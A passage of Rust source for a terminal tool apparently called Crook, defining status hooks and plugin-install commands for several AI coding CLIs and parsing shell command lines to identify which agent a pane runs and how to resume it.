/// It is also what tells the window that a question it holds was answered
/// in Claude Code's own dialog, which says nothing to the question's hook:
/// the tool ran, so somebody said yes — see [`done_from_hook`]. A tool that
/// failed runs `PostToolUseFailure` instead, with the same input, so that
/// event runs the same command: the work goes on after a failed command as
/// after one that worked, and the question it was asked with is as answered.
/// A Crook older than the done reads that input as it reads `PostToolUse`'s.
const CLAUDE_EVENTS: &[(&str, &str)] = &[
    ("UserPromptSubmit", "running --title -"),
    ("PreToolUse", "running"),
    ("PostToolUse", "running --pull-request -"),
    ("PostToolUseFailure", "running --pull-request -"),
    ("Notification", "needs-input --message -"),
    ("Stop", "idle"),
    ("StopFailure", "failed --message -"),
    ("SessionEnd", "idle"),
];

/// What Claude Code can say with neither the plugin nor the hooks: a
/// notification in one of the three forms Crook reads, once it is told which.
///
/// Its notification channel is `auto` until a person sets it, and `auto`
/// picks a form by `TERM_PROGRAM` — iTerm2's, kitty's or Ghostty's — and
/// nothing at all for a terminal it does not know, Crook included. The
/// setting is Claude Code's `preferredNotifChannel`, read from its
/// `settings.json` and offered in its `/config`. Whichever of the three the
/// person's other terminal is, because the setting holds in every terminal
/// and `auto` would have picked that one there; Crook reads all three.
const CLAUDE_WITHOUT_HOOKS: &str = "\n# With neither the plugin nor these hooks, Claude \
Code can still ask for a look when it stops: set \"preferredNotifChannel\" in \
~/.claude/settings.json, or in its /config, to \"ghostty\", \"kitty\" or \"iterm2\" — \
whichever your other terminal is, since it then holds everywhere. Crook reads all three; \
the \"auto\" it starts with picks by terminal name and picks nothing in Crook.";

/// The commands that install Crook's Claude Code plugin: this repository as
/// a marketplace, then the one plugin in it.
///
/// `claude plugin install` writes Claude Code's own settings, which is what
/// lets a person connect it without merging JSON and without Crook opening a
/// file it does not own. The names are the ones
/// `.claude-plugin/marketplace.json` gives, and a test holds them to it.
const CLAUDE_PLUGIN: &[&str] = &[
    "claude plugin marketplace add theguriev/crook",
    "claude plugin install crook@crook",
];

/// The Codex CLI hooks: the same object as Claude Code's, in
/// `~/.codex/hooks.json`, with most of the same event names.
///
/// Codex has no `Notification`; what it has is `PermissionRequest`, run
/// before an approval prompt, whose input names the tool and not a message
/// — [`message_from_hook`] says "permission to use" the tool then. Nor has
/// it a `StopFailure`. A question the model asks in its reply ends its turn,
/// which is `Stop`. In Plan mode it can ask in a dialog instead, its
/// `request_user_input` tool, which holds the turn open: codex-cli 0.149.1
/// runs `PreToolUse` for it and nothing more until the person answers, so
/// the row says running, and the title's "Action Required", which says the
/// question in a pane with no hooks, is outranked by that running. Outside
/// Plan mode the tool only tells the model it is unavailable.
/// Its older `notify` setting runs a program with a JSON argument
/// when a turn ends and nothing else, and is the legacy of these; the hooks
/// say more. Its `PostToolUse` names the shell tool `Bash` and puts the
/// command under `tool_input.command` as Claude Code's does, with the output
/// the model saw as `tool_response`, so the same hook finds a pull request
/// there.
const CODEX_EVENTS: &[(&str, &str)] = &[
    ("UserPromptSubmit", "running --title -"),
    ("PreToolUse", "running"),
    ("PostToolUse", "running --pull-request -"),
    ("PermissionRequest", "needs-input --message -"),
    ("Stop", "idle"),
    ("SessionEnd", "idle"),
];

/// What Codex asks before it runs the hooks, as codex-cli 0.149.1 asks it.
///
/// Its next start opens on "Hooks need review", and the last of the three
/// answers is "Continue without trusting (hooks won't run)", which leaves the
/// tab saying nothing at all. It keeps a hash of each hook it was told to
/// trust, so a hook whose command changes — one a newer Crook prints
/// differently, merged again — is held back for the same review, which
/// `/hooks` also opens.
const CODEX_TRUST: &str = "\n# Codex runs none of them until you trust them: it asks on its next \
start, or in its /hooks, and asks again whenever a hook's command changes.";

/// The commands that install Crook's plugin for Codex CLI: the marketplace
/// Claude Code's commands add, and the same plugin in it, in Codex's own
/// words.
///
/// codex-cli 0.149 reads a marketplace's `.claude-plugin/marketplace.json`
/// when it has none of its own, and in the plugin's directory reads
/// `.codex-plugin/plugin.json` before Claude Code's manifest. That one names
/// `hooks/codex.json` — [`CODEX_EVENTS`], as `--agent-hooks codex` prints
/// them — in place of the `hooks/hooks.json` Claude Code reads, whose
/// `Notification` Codex has no event for: with only that file the plugin
/// said running and idle, and never that Codex had stopped for an approval.
/// The plugin's hooks wait for the same review as hooks merged by hand, so
/// the lead says [`CODEX_TRUST`] as well.
const CODEX_PLUGIN: &[&str] = &[
    "codex plugin marketplace add theguriev/crook",
    "codex plugin add crook@crook",
];

/// The Gemini CLI hooks: the same object, in `~/.gemini/settings.json`,
/// under its own names — `BeforeAgent` for the prompt, `BeforeTool` and
/// `AfterTool` around a tool, `AfterAgent` for the end of a turn.
///
/// Its `Notification` fires whenever a tool waits for confirmation and
/// carries a `message`, the way Claude Code's does. One of those tools is
/// `ask_user`, the dialog its model asks a person questions in, which Gemini
/// CLI 0.61.0 offers in every interactive session and always confirms: its
/// notification says "Tool requires confirmation", with the questions only
/// under `details`, so the row says needs-input without them. A question the
/// model asks in its reply is the end of a turn, which is `AfterAgent`.
const GEMINI_EVENTS: &[(&str, &str)] = &[
    ("BeforeAgent", "running --title -"),
    ("BeforeTool", "running"),
    ("AfterTool", "running"),
    ("Notification", "needs-input --message -"),
    ("AfterAgent", "idle"),
    ("SessionEnd", "idle"),
];

/// The GitHub Copilot CLI hooks, in a file of their own under
/// `~/.copilot/hooks/`: camel-cased names for the same moments, with
/// `agentStop` for the end of a turn and `notification` carrying a
/// `message`.
///
/// Every one says which session it is from. Copilot runs a subagent in a
/// session of its own and runs every hook for it as for the session the
/// person is talking to: its `userPromptSubmitted` carries the prompt the
/// agent wrote for it, and its `agentStop` comes while the agent is still
/// working. Named, the pane takes neither — see [`crook_terminal::agent`].
///
/// `sessionStart` is the one Copilot runs only for a session a person
/// began or resumed, never a subagent's: on the first prompt the process
/// sees in it, a few milliseconds after that prompt's `userPromptSubmitted`,
/// with the prompt as `initialPrompt`. So it hands the pane to its session,
/// which a turn interrupted with Esc — no `agentStop` — and then `/new` or
/// `/resume` would otherwise leave held by the session before, and names
/// the work again, since the prompt's own report lost its title to that
/// session. It runs once a session in the life of the process, and
/// `/resume` back to a session already run says none; the pane remembers
/// the sessions that started instead, so a turn in one takes the pane back
/// — and knows every other session for a subagent's, a background one
/// that goes on after the agent stopped included.
///
/// Not `permissionRequest`, which Copilot 1.0.89 runs before its rules have
/// decided, so for a tool `--allow-all-tools` lets through with nobody asked
/// as well as for one it stops to ask about; `notification` comes only for
/// the second, with the question as its `message`.
const COPILOT_EVENTS: &[(&str, &str)] = &[
    ("sessionStart", "running --title - --session-start -"),
    ("userPromptSubmitted", "running --title - --session -"),
    ("preToolUse", "running --session -"),
    ("postToolUse", "running --session -"),
    ("notification", "needs-input --message - --session -"),
    ("agentStop", "idle --session -"),
    ("sessionEnd", "idle --session -"),
];

/// The commands that install Crook's plugin for GitHub Copilot CLI.
///
/// Copilot 1.0.89 reads the same `.claude-plugin/marketplace.json`, and in
/// the plugin's directory reads `.github/plugin/plugin.json` before Claude
/// Code's manifest. That one names `hooks/copilot.json` — [`COPILOT_EVENTS`],
/// in the file `--agent-hooks copilot` prints. Without it Copilot runs
/// Claude Code's `hooks/hooks.json` under Claude Code's names, which pass no
/// `--session`: a subagent's prompt would name the tab and its stop would end
/// the turn, which is what Copilot's own table is written to keep out.
const COPILOT_PLUGIN: &[&str] = &[
    "copilot plugin marketplace add theguriev/crook",
    "copilot plugin install crook@crook",
];

/// The OpenCode plugin: a TypeScript file its plugin directory loads at
/// startup, since OpenCode has no command hooks in its settings.
///
/// A plugin is a function handed the Bun shell and a client of OpenCode's own
/// server, and returning the hooks it wants: `chat.message` for a prompt,
/// with the message's own parts to name the work from, and `event` for the
/// bus — `session.status` says busy or idle, `permission.asked` and
/// `question.asked` are the two ways it stops for a person, and their replies
/// are when it goes on. The binary is spliced in as a string literal, because
/// a plugin runs in whatever `PATH` OpenCode was started with and a
/// development build is on nobody's. `.quiet().nothrow()`: a report that
/// could not be written — no terminal, a pane that is not Crook's — is
/// nothing a plugin should throw over.
///
/// A subagent runs in a session of its own, made with its parent's id as
/// `parentID`, and the hooks fire for it as for any session: its prompt named
/// the tab, and its idle came while the agent above it was still working. So
/// the plugin says nothing for a subagent's session but its questions and the
/// going on after one, which are the agent's own. It knows one by the
/// `parentID` `session.created` gives it — the way `opencode run` tells the
/// sessions it waits on from the rest — and asks OpenCode, through the
/// `client` a plugin is handed, about a session it did not see made: the
/// `task` tool goes on in an earlier subagent's session when handed its
/// `task_id`, which makes no new one, and that session can be older than the
/// OpenCode the plugin was loaded into. Asked once a session, and a session
/// that cannot be asked about is reported, as every session was before.
///
/// A prompt's title comes from text the person wrote, not from a part
/// OpenCode marks `synthetic`: the result of a background task is handed to
/// the session that started it as a prompt of its own, a synthetic
/// `<task id=… state="completed">`, and that is no name for the work.
///
/// OpenCode does not wait for an event's handler, and a report is a
/// process of its own, so two started together can reach the pane in
/// either order: an idle overtaken by the busy before it left the pane
/// running. So the reports go one after another, through one promise, and
/// a status said again is not said: a turn is busy several times over, and
/// each was a process. A title or a question always goes, since a new one
/// is news.
const OPENCODE_PLUGIN: &str = r#"// Crook: tell the tab this session runs in what OpenCode is doing.
// Save as ~/.config/opencode/plugins/crook.ts, or as a project's
// .opencode/plugins/crook.ts. Reports go to the terminal OpenCode was
// started in, so this is for `opencode` run in a pane, not `opencode serve`.
const crook = BINARY

export const CrookPlugin = async ({ $, client }) => {
  // A subagent's session is made with its parent's id. Its prompt is not
  // the tab's name and its idle is not the end of the work, so of a
  // subagent only its questions, and the going on after one, are reported.
  // A session not seen made — a subagent's that `task` went on in by its
  // id — is asked about once; one that cannot be is reported.
  const subagents = new Map()
  const subagent = (id) => {
    if (!subagents.has(id))
      subagents.set(
        id,
        Promise.resolve()
          .then(() => client.session.get({ path: { id } }))
          .then((found) => Boolean(found?.data?.parentID), () => false),
      )
    return subagents.get(id)
  }
  // One report at a time, in the order they were made, and a status said
  // again left unsaid: OpenCode does not wait for an event's handler, and
  // two processes started together can land in either order.
  let reports = Promise.resolve()
  let said
  const report = (session, status, flag, text) => {
    reports = reports
      .then(async () => {
        if (session !== undefined && (await subagent(session))) return
        if (text === undefined && status === said) return
        said = status
        await (text === undefined
          ? $`${crook} --agent ${status}`
          : $`${crook} --agent ${status} ${flag} ${text}`
        ).quiet().nothrow()
      })
      .catch(() => {})
    return reports
  }
  return {
    "chat.message": async (input, output) => {
      // What the person wrote, not what OpenCode added: a background task's
      // result comes back as a synthetic prompt of its own.
      const text = output.parts.find((part) => part.type === "text" && !part.synthetic)?.text ?? ""
      const title = (text.split("\n").find((line) => line.trim() !== "") ?? "").trim()
      // A lone `-` is how `--title` is told to read a hook's input from stdin,
      // so a prompt that opens with one is sent with no title rather than as
      // that instruction — and so is a prompt with no text at all.
      await (title === "" || title === "-"
        ? report(input.sessionID, "running")
        : report(input.sessionID, "running", "--title", title))
    },
    event: async ({ event }) => {
      const properties = event.properties
      switch (event.type) {
        case "session.created":
          subagents.set(properties.info.id, Promise.resolve(Boolean(properties.info.parentID)))
          break
        case "session.status":
          if (properties.status.type === "busy") await report(properties.sessionID, "running")
          break
        case "permission.asked":
          await report(undefined, "needs-input", "--message", `${properties.permission}: ${properties.patterns.join(", ")}`)
          break
        case "question.asked":
          await report(undefined, "needs-input", "--message", properties.questions[0]?.question ?? "")
          break
        case "permission.replied":
        case "question.replied":
          await report(undefined, "running")
          break
        case "session.idle":
          await report(properties.sessionID, "idle")
          break
      }
    },
  }
}
"#;

/// The agents, in the order the errors list them.
///
/// The resume lines are each CLI's own documented spelling, and only where
/// the documentation says the line is about the directory it runs in: the
/// directory is the whole of how a restored pane finds its conversation
/// again. Claude Code's `--continue` is "the most recent conversation in the
/// current directory" and its bare `--resume` a picker; Codex's `resume
/// --last` is "the most recent chat from the current working directory" and
/// its bare `resume` a picker of that directory's; Gemini CLI keeps its
/// sessions per project path and `--resume latest` takes the newest, with no
/// picker on the command line. Copilot's `--continue` is documented as the
/// most recent session of the *repository*, which every worktree of a
/// repository shares, so it gets its picker for both. OpenCode's `--continue`
/// is the newest session across a repository's root-level worktrees — an
/// open bug, anomalyco/opencode#41562 — and it has no picker flag, so it
/// gets neither. Aider gets none by default either, though
/// `aider --restore-chat-history`, which reloads its chat history file, is a
/// line to give it. Any of them can be given a line in the settings; see
/// [`Settings::resume_line`](crate::settings::Settings::resume_line).
const AGENTS: &[Agent] = &[
    Agent {
        name: "claude",
        program: "Claude Code",
        package: Some("@anthropic-ai/claude-code"),
        fragment: Fragment::Hooks {
            file: "~/.claude/settings.json, or a project's .claude/settings.json",
            events: CLAUDE_EVENTS,
            missing: "",
            trust: "",
            without: CLAUDE_WITHOUT_HOOKS,
        },
        prompt_flag: None,
        plugin: CLAUDE_PLUGIN,
        last: Some("claude --continue"),
        pick: Some("claude --resume"),
    },
    Agent {
        name: "codex",
        program: "Codex CLI",
        package: Some("@openai/codex"),
        fragment: Fragment::Hooks {
            file: "~/.codex/hooks.json, or a project's .codex/hooks.json",
            events: CODEX_EVENTS,
            missing: " Codex has no notification hook: the row says needs-input for a \
permission, a question the model asks in its reply ends its turn as idle, and one it asks \
in Plan mode, in its question dialog, keeps the row running until it is answered.",
            trust: CODEX_TRUST,
            without: "",
        },
        prompt_flag: None,
        plugin: CODEX_PLUGIN,
        last: Some("codex resume --last"),
        pick: Some("codex resume"),
    },
    Agent {
        name: "gemini",
        program: "Gemini CLI",
        package: Some("@google/gemini-cli"),
        fragment: Fragment::Hooks {
            file: "~/.gemini/settings.json, or a project's .gemini/settings.json",
            events: GEMINI_EVENTS,
            missing: " Gemini CLI notifies whenever a tool waits for confirmation, its \
ask_user questions included, which the row says as needs-input: a question the model asks \
in its reply ends its turn as idle.",
            trust: "",
            without: "",
        },
        prompt_flag: Some("-i"),
        plugin: &[],
        last: Some("gemini --resume latest"),
        pick: None,
    },
    Agent {
        name: "copilot",
        program: "GitHub Copilot CLI",
        package: Some("@github/copilot"),
        fragment: Fragment::Copilot {
            file: "~/.copilot/hooks/crook.json, or a project's .github/hooks/crook.json",
            events: COPILOT_EVENTS,
        },
        prompt_flag: Some("-i"),
        plugin: COPILOT_PLUGIN,
        last: Some("copilot --resume"),
        pick: Some("copilot --resume"),
    },
    Agent {
        name: "opencode",
        program: "OpenCode",
        package: Some("opencode-ai"),
        fragment: Fragment::Plugin {
            file: "~/.config/opencode/plugins/crook.ts, or a project's .opencode/plugins/crook.ts",
            source: OPENCODE_PLUGIN,
        },
        prompt_flag: Some("--prompt"),
        plugin: &[],
        last: None,
        pick: None,
    },
    Agent {
        name: "aider",
        program: "aider",
        package: None,
        fragment: Fragment::None(
            "aider has no hooks. Its `--notifications-command` runs one command when a turn \
ends and it waits for you, so `aider --notifications --notifications-command \"BINARY \
--agent idle\"` reports idle there and nothing else; for running, start it from a \
wrapper script that runs `BINARY --agent running` first.",
        ),
        prompt_flag: Some("--message"),
        plugin: &[],
        last: None,
        pick: None,
    },
];

/// The known agent a command line starts, by its program's name, or `None`
/// when the line starts something else.
///
/// The program's file name: `claude "fix the login bug"` and
/// `/opt/homebrew/bin/claude --model opus` are both `claude`. Nothing after
/// it is ever handed on, because what comes after it is where a person
/// types the prompt. A word that names no agent this module knows —
/// `cargo`, `vim`, a `claudette` — is `None`.
///
/// The program is read past what only runs it — `env`, `npx`, `mise x` —
/// the way [`launch_of`] reads it, so `npx @google/gemini-cli` is `gemini`.
/// It is named for a line [`launch_of`] gives no launch for as well — one
/// that ran it in another directory, `env -C`, or some way no line kept of
/// it could repeat, `mise x --deny-all` — because it is what the pane is
/// running now, and the pane's title is read by it: codex's spinner is
/// codex's only in a pane that runs codex. What the session file keeps is
/// [`launch_of`]'s answer, and never this one.
///
/// The words as the shell reads them, quotes and all: `crook tab new` types
/// every word of its command in single quotes, so a worker it opens runs
/// `'codex' 'fix the flaky test'`, and that is `codex` as well.
pub fn program_of(command: &str) -> Option<&'static str> {
    read_line(command).map(|reading| reading.launch.agent)
}

/// How a command line starts a known agent: which one, and the words that
/// ran it when its own name was not what did.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Launch {
    /// The agent, by its name in the table: `gemini`.
    pub agent: &'static str,
    /// The words that ran the agent in its own name's place —
    /// `npx @google/gemini-cli`, `mise x node@22 -- claude` — or `None` for
    /// an agent run by its name.
    ///
    /// What a resume line is spelled through: see [`Self::through_launcher`].
    pub launcher: Option<String>,
}

impl Launch {
    /// The launch a session file remembers, when the table answers to it:
    /// `agent` one of its names, and `launcher` words that [`launch_of`]
    /// reads back as themselves, starting that agent. A launcher in any
    /// other shape — another build's, a hand edit's, a command after a `;` —
    /// comes back as the agent alone, and a name no agent answers to as
    /// nothing, since what a restored pane is offered comes from the table
    /// and never from the file.
    pub fn remembered(agent: &str, launcher: Option<&str>) -> Option<Self> {
        let agent = AGENTS.iter().find(|known| known.name == agent)?.name;
        let launcher = launcher.filter(|launcher| {
            launch_of(launcher).is_some_and(|launch| {
                launch.agent == agent && launch.launcher.as_deref() == Some(launcher)
            })
        });
        Some(Self {
            agent,
            launcher: launcher.map(str::to_owned),
        })
    }

    /// `line`, run the way this launch ran its agent: the agent's name at
    /// its start swapped for the launcher, so that `gemini --resume latest`
    /// is `npx @google/gemini-cli --resume latest` for a pane that started
    /// Gemini CLI through `npx`, where there is no `gemini` on `PATH` to
    /// run.
    ///
    /// A line that starts some other way — a person's own, through an alias
    /// of theirs — says how they want it run, and is left as it is.
    pub fn through_launcher(&self, line: String) -> String {
        let Some(launcher) = &self.launcher else {
            return line;
        };
        match line.strip_prefix(self.agent) {
            Some(rest) if rest.is_empty() || rest.starts_with(char::is_whitespace) => {
                format!("{launcher}{rest}")
            }
            _ => line,
        }
    }
}

/// How `command` starts a known agent, or `None` when it starts something
/// else or starts it in a way no line kept of it could start it again —
/// see [`program_of`] for how the program is read. This is the answer the
/// session file keeps, so a file never holds the name of a program Crook
/// would not know how to offer back.
///
/// Read past the words that only run the program. Some are dropped: `env`
/// and its options, `NAME=value` assignments, `command`, `exec`, `time`,
/// `nohup` and `nice`. An assignment is where a person puts an API key,
/// which has no place in a file anybody with the home directory can read,
/// so every one is dropped, whatever it sets — a `PATH=` that is how the
/// program was found as well, which leaves that agent resumed by its name
/// alone, where the shell may not find it. The others are kept as the
/// [`Launch::launcher`], because without them the program is not found at
/// all: a package runner — `npx`, `bunx` or `bun x`, `pnpm dlx` or `pnpx`,
/// `yarn dlx`, `npm exec` — handed the agent's package, and a version
/// manager's `mise x … --` or `asdf exec`. Somebody who runs Gemini CLI the
/// way its own quick start does, `npx @google/gemini-cli`, has no `gemini`
/// on `PATH` to resume with.
///
/// What is kept is rebuilt rather than copied: each program by its name and
/// not its path, a runner's package without the runner's options — `-y`, a
/// registry's address — and `mise`'s tools without its own, and only words
/// that mean the same typed into any shell. Nothing after the agent's
/// program is ever kept.
///
/// A line that ran the agent somewhere other than the pane's directory —
/// `env -C`, `mise x -C`, `npx --workspace` — or some way no line kept of
/// it could run it again — `mise x` with a sandbox's `--deny-*` and
/// `--allow-*`, with `-E` — is no launch: every resume line it could be
/// offered would resume another directory's conversation, or run the agent
/// some other way. So is one given an option of `env`'s, a runner's or
/// `mise`'s that this does not know, in any spelling — `env -iC/srv`, `env
/// --chd=/srv` — since only the options known to change nothing are passed
/// over (see `past_env_options`, `package_run` and `mise_exec`). The agent
/// such a line runs is still [`program_of`]'s.
///
/// An alias is not seen through. The shell reports the line as it was
/// typed, and `cc` is a word only the shell that defined it can expand.
/// Neither is a `PATH=`, above.
pub fn launch_of(command: &str) -> Option<Launch> {
    read_line(command)
        .filter(|reading| reading.repeatable)
        .map(|reading| reading.launch)
}

/// A command line's agent as [`launch_of`] and [`program_of`] read it.
struct Reading {
    /// The agent, and the launcher it was found through.
    launch: Launch,
    /// Whether the line ran it in the pane's directory, and in no way that
    /// a line kept of it would leave out: whether it has a [`launch_of`].
    repeatable: bool,
}

/// How `command` starts a known agent, or `None` when it starts something
/// else: the reading behind [`launch_of`] and [`program_of`].
fn read_line(command: &str) -> Option<Reading> {
    let words = words(command);
    let mut rest = words.as_slice();
    let mut kept: Vec<&str> = Vec::new();
    let mut repeatable = true;
    loop {
        let (word, after) = rest.split_first()?;
        if is_assignment(word) {
            rest = after;
            continue;
        }
        let program = program_name(word);
        let second = after.first().map(String::as_str);
        rest = match (program, second) {
            ("env", _) => {
                let (command, unchanged) = past_env_options(after);
                repeatable &= unchanged;
                command
            }
            // Says what the name is, and runs nothing.
            ("command", Some("-v" | "-V")) => return None,
            ("command" | "nohup", _) => past_options(after, &[]),
            ("exec", _) => past_options(after, &["-a"]),
            ("time", _) => past_options(after, &["-f", "--format", "-o", "--output"]),
            ("nice", _) => past_options(after, &["-n", "--adjustment"]),
            ("mise", Some(verb @ ("x" | "exec"))) => {
                let (tools, command) = mise_exec(&after[1..])?;
                match tools {
                    // A tool that would need quoting leaves `mise` out of
                    // the launcher altogether: the launcher is typed back
                    // as it is, into whatever shell the pane has.
                    Some(tools) => {
                        if tools.iter().all(|tool| plain(tool)) {
                            kept.extend(["mise", verb]);
                            kept.extend(tools);
                            kept.push("--");
                        }
                    }
                    None => repeatable = false,
                }
                command
            }
            ("asdf", Some("exec")) => {
                kept.extend(["asdf", "exec"]);
                &after[1..]
            }
            ("npx" | "bunx" | "pnpx", _) => {
                return package_run(kept, repeatable, &[program], after);
            }
            ("bun", Some(verb @ "x")) | ("pnpm" | "yarn", Some(verb @ "dlx")) => {
                return package_run(kept, repeatable, &[program, verb], &after[1..]);
            }
            // The one runner that reads the options after the package as
            // its own, unless a `--` comes first.
            ("npm", Some(verb @ ("exec" | "x"))) => {
                return package_run(kept, repeatable, &[program, verb, "--"], &after[1..]);
            }
            _ => {
                let agent = AGENTS.iter().find(|agent| agent.name == program)?;
                let launcher = (!kept.is_empty()).then(|| {
                    kept.push(agent.name);
                    kept.join(" ")
                });
                return Some(Reading {
                    launch: Launch {
                        agent: agent.name,
                        launcher,
                    },
                    repeatable,
                });
            }
        };
    }
}

/// The agent a package runner is asked to run, from the words after the
/// runner's own: the package it was handed, or the program it was told to
/// run out of a `--package`, which has to be that agent's own package.
///
/// The launcher is what was `kept` before the runner, the runner, and the
/// package as it was asked for — `@google/gemini-cli@0.9.0` stays that
/// version — unless the request needs quoting, when it is the package by its
/// name alone.
///
/// `repeatable` is what the words before the runner left the line. The
/// runner's options passed over are the ones that say whether it asks
/// before an install, how much it prints, whether it goes to the network
/// for the package and which registry it fetches it from — none of which
/// changes what runs or where. Any other leaves the line no launch, though
/// it still names its agent: npm's `--workspace` and `--workspaces` run the
/// package in a workspace's directory, which the pane is not in, and an
/// option this does not know may do the same. Such an option is taken to
/// have no value but one after its `=`, so a value in the word after it is
/// taken for the package, which is no agent's.
fn package_run<'w>(
    mut kept: Vec<&'w str>,
    mut repeatable: bool,
    runner: &[&'w str],
    words: &'w [String],
) -> Option<Reading> {
    /// The runners' options that change nothing about what they run.
    const PASSED_OVER: &[&str] = &[
        "-y",
        "--yes",
        "--no",
        "-q",
        "--quiet",
        "--silent",
        "--verbose",
        "--prefer-offline",
        "--prefer-online",
        "--offline",
    ];
    let mut asked = None;
    let mut rest = words;
    let target = loop {
        let (word, after) = rest.split_first()?;
        rest = after;
        if word == "--" {
            break rest.first()?;
        }
        if let Some(package) = word.strip_prefix("--package=") {
            asked = Some(package);
        } else if word == "-p" || word == "--package" {
            let (package, after) = rest.split_first()?;
            asked = Some(package.as_str());
            rest = after;
        } else if word == "--registry" {
            rest = rest.get(1..)?;
        } else if !word.starts_with('-') {
            break word;
        } else if !(PASSED_OVER.contains(&word.as_str()) || word.starts_with("--registry=")) {
            repeatable = false;
        }
    };
    let (agent, asked) = match asked {
        None => {
            let name = package_name(target);
            let agent = AGENTS.iter().find(|agent| agent.package == Some(name))?;
            (agent, target.as_str())
        }
        Some(asked) => {
            let program = program_name(target);
            let agent = AGENTS.iter().find(|agent| agent.name == program)?;
            (agent.package == Some(package_name(asked))).then_some((agent, asked))?
        }
    };
    kept.extend(runner);
    kept.push(if plain(asked) { asked } else { agent.package? });
    Some(Reading {
        launch: Launch {
            agent: agent.name,
            launcher: Some(kept.join(" ")),
        },
        repeatable,
    })
}

/// A package's name out of what a runner was asked for, with the version
/// after it taken off: `opencode-ai@latest` is `opencode-ai`, and
/// `@google/gemini-cli@0.9.0` is `@google/gemini-cli`, the `@` of its scope
/// being no version's.
fn package_name(asked: &str) -> &str {
    let version = match asked.strip_prefix('@') {
        Some(scoped) => scoped.find('@').map(|at| at + 1),
        None => asked.find('@'),
    };
    version.map_or(asked, |at| &asked[..at])
}

/// The tools `mise x` was given and the command after its `--`, or `None`
/// for a `mise x` with no `--`, which runs no command of its own, and for
/// one given `-c`, a command of its own, which `mise` refuses beside a
/// `--`.
///
/// Only the tools are kept. The options passed over are the ones that say
/// how much `mise` prints, whether it asks before an install and how many
/// it runs at once, and how it prepares one — none of which changes what
/// the command is or where it runs. Any other leaves no tools, the line of
/// no launch: `-C` runs the command in a directory the pane is not in,
/// whose conversation a resume line in the pane's would never reach; `-E`
/// loads another environment's config; a sandbox's `--deny-*` and
/// `--allow-*` confine it, and a resume line without them would not. So
/// does any of them in a cluster, `-qC/srv`, and an option this does not
/// know, since its value would otherwise be taken for a tool and written
/// into the file.
fn mise_exec(words: &[String]) -> Option<(Option<Vec<&str>>, &[String])> {
    /// `mise x`'s options that change nothing about the command it runs.
    const PASSED_OVER: &[&str] = &[
        "-q",
        "--quiet",
        "--silent",
        "--verbose",
        "-y",
        "--yes",
        "--fresh-env",
        "--no-deps",
        "--raw",
        "--locked",
    ];
    /// Its short options that take a value, in the rest of their word or
    /// the next.
    const VALUED: &str = "CEcj";
    let end = words.iter().position(|word| word == "--")?;
    let mut tools = Some(Vec::new());
    let mut options = words[..end].iter().map(String::as_str);
    while let Some(word) = options.next() {
        let short = word
            .strip_prefix('-')
            .filter(|letters| !letters.starts_with('-'));
        if word == "--command"
            || word.starts_with("--command=")
            || short.and_then(|letters| letters.chars().find(|letter| VALUED.contains(*letter)))
                == Some('c')
        {
            return None;
        }
        if word == "-j" || word == "--jobs" {
            options.next()?;
        } else if !word.starts_with('-') {
            if let Some(tools) = &mut tools {
                tools.push(word);
            }
        } else if !(PASSED_OVER.contains(&word)
            || word.starts_with("--jobs=")
            || (word.len() > 1 && word[1..].chars().all(|letter| letter == 'v')))
        {
            tools = None;
        }
    }
    Some((tools, &words[end + 1..]))
}

/// `words` past `env`'s own options, and whether every one of them changes
/// nothing about where or how the command after them runs.
///
/// Those are `-i`, `-0`, `-v` and `-u NAME`, alone or in a cluster, a bare
/// `-`, and `--ignore-environment`, `--null`, `--debug` and `--unset`,
/// spelled out. Anything else does, or may: `-C` and `--chdir` run the
/// command in another directory, in every spelling getopt takes — `-iC/srv`,
/// `--chd=/srv` — and `-S`, `-a` and BSD's `-P` change what runs or where
/// it is found. The words those take a value from are passed over with
/// them, so the program after them is still the one read.
fn past_env_options(words: &[String]) -> (&[String], bool) {
    // The options that take a value in the next word when they end theirs:
    // short, and long by any prefix of the name, which getopt takes for the
    // whole of it when no other option shares the prefix — and none does
    // with these.
    const VALUED_SHORT: &str = "uCSaP";
    const VALUED_LONG: &[&str] = &["unset", "chdir", "split-string", "argv0"];
    let mut rest = words;
    let mut unchanged = true;
    while let Some((word, after)) = rest.split_first() {
        if word == "--" {
            return (after, unchanged);
        }
        let Some(option) = word.strip_prefix('-') else {
            break;
        };
        rest = after;
        let takes_next = match option.strip_prefix('-') {
            Some(long) => {
                let (name, value) = match long.split_once('=') {
                    Some((name, value)) => (name, Some(value)),
                    None => (long, None),
                };
                unchanged &= match name {
                    "ignore-environment" | "null" | "debug" => value.is_none(),
                    "unset" => true,
                    _ => false,
                };
                value.is_none()
                    && !name.is_empty()
                    && VALUED_LONG.iter().any(|valued| valued.starts_with(name))
            }
            None => {
                let valued = option.find(|letter| VALUED_SHORT.contains(letter));
                let flags = &option[..valued.unwrap_or(option.len())];
                unchanged &= flags.chars().all(|letter| "i0v".contains(letter))
                    && valued.is_none_or(|at| option[at..].starts_with('u'));
                valued.is_some_and(|at| at + 1 == option.len())
            }
        };
        if takes_next {
            rest = rest.get(1..).unwrap_or_default();
        }
    }
    (rest, unchanged)
}

/// `words` past a wrapper's own options: every word up to the first that
/// does not start with `-`, the one after each option in `valued` with it,
/// and a `--` that ends them.
fn past_options<'w>(words: &'w [String], valued: &[&str]) -> &'w [String] {
    let mut rest = words;
    while let Some((word, after)) = rest.split_first() {
        if word == "--" {
            return after;
        }
        if !word.starts_with('-') {
            break;
        }
        rest = if valued.contains(&word.as_str()) {
            after.get(1..).unwrap_or_default()
        } else {
            after
        };
    }
    rest
}

/// Whether a word sets a variable for the command after it: `NAME=value`,
/// with a name a shell would take as one.
fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        let mut characters = name.chars();
        characters
            .next()
            .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
            && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
    })
}

/// Whether a word reads as itself in every shell a pane can have, with no
/// quotes around it — so that the launcher it goes into can be typed back
/// as it is.
fn plain(word: &str) -> bool {
    !word.is_empty()
        && word
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "@+-._/:".contains(character))
}

/// A word's program, by its file name: `/opt/homebrew/bin/claude` is
/// `claude`.
fn program_name(word: &str) -> &str {
    let file = word.rsplit(['/', '\\']).next().unwrap_or(word);
    // Windows' own spellings of the same program: the binary, and the shim
    // npm installs a Node CLI as.
    file.strip_suffix(".exe")
        .or_else(|| file.strip_suffix(".cmd"))
        .unwrap_or(file)
}

/// The words of a command line, the way a shell splits them: at spaces
/// outside quotes, with the quotes taken out — so a path with a space in it,
